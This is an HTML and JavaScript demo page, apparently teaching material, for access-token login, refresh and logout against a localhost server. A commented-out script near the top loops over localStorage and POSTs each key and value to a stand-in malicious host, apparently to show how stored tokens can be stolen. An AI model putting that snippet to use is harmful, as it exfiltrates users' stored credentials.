<!--~~~~~~~~~~~~~~~~~~~~~
  ~ Made by [MR Ferryâ„¢] ~
  ~ on November 2025    ~
  ~~~~~~~~~~~~~~~~~~~~~-->
<!DOCTYPE html>
<html lang="id">
<head>
	<title>Token Demo</title>
</head>
<body>
<h2>Login</h2>
<label for="username"></label><input id="username" placeholder="Username"/>
<label for="password"></label><input id="password" type="password" placeholder="Password"/>
<button onclick="login()">Login</button>

<h2>Profile</h2>
<button onclick="getProfile()">Get Profile</button>

<p id="output"></p>
<button onclick="logout()">Logout</button>

<script>
	// console.log(accessToken);
	// let length = localStorage.length;
	// for(let i = 0; i < length; i++){
	// 	let key = localStorage.key(i);
	// 	let item = localStorage.getItem(key);
	// 	console.log(key + " : " + item);
	// 	fetch(`http://dangerouse-site.com?key=${key}&item=${item}`, {
	// 		method: "POST",
	// 	});
	// }
</script>
<script>
	const site = 'http://localhost:8888';
	let accessToken = "";
	generateToken()
			.then(token => {
				accessToken = token;
				// localStorage.setItem('accessToken', accessToken)
			});

	async function login(){
		const res = await fetch(`${site}/auth/login`, {
			method: 'POST',
			headers: {'Content-Type': 'application/json'},
			body: JSON.stringify({
				username: document.getElementById('username').value,
				password: document.getElementById('password').value
			}),
			credentials: 'include'
		});

		if(!res.ok){
			document.getElementById('output').innerText = await res.text();
			return;
		}
		const data = await res.json();
		accessToken = data.accessToken;
		document.getElementById('output').innerText = data.message;
	}

	async function getProfile(){
		let res = await fetch(`${site}/profile`, {
			method: 'GET',
			headers: {"Authorization": "Bearer " + accessToken}
		});
		if(res.status === 401){
			accessToken = await generateToken();
			if(!accessToken){
				document.getElementById('output').innerText = 'Session expired.';
				return;
			}
			res = await fetch(`${site}/profile`, {
				method: 'GET',
				headers: {"Authorization": "Bearer " + accessToken}
			});
			if(!res.ok){
				document.getElementById('output').innerText = "failed to access";
				return;
			}
		}
		document.getElementById('output').innerText = await res.text();
	}

	async function generateToken(){
		const refresh = await fetch(`${site}/auth/refresh`, {
			method: "POST",
			credentials: "include"
		});
		if(refresh.ok){
			const data = await refresh.json();
			return data.accessToken;
		} else{
			return null;
		}
	}

	async function logout(){
		let res = await fetch(`${site}/auth/logout`, {
			method: 'GET',
			headers: {"Authorization": "Bearer " + accessToken}
		});

		if(res.status === 401){
			accessToken = await generateToken();
			if(!accessToken){
				document.getElementById('output').innerText = 'Session expired.';
				return;
			}
			res = await fetch(`${site}/auth/logout`, {
				method: 'GET',
				headers: {"Authorization": "Bearer " + accessToken}
			});
			if(!res.ok){
				document.getElementById('output').innerText = "failed to access";
				return;
			}
		}
		const data = await res.json();
		document.getElementById('output').innerText = data.message;
	}

</script>
</body>
</html>
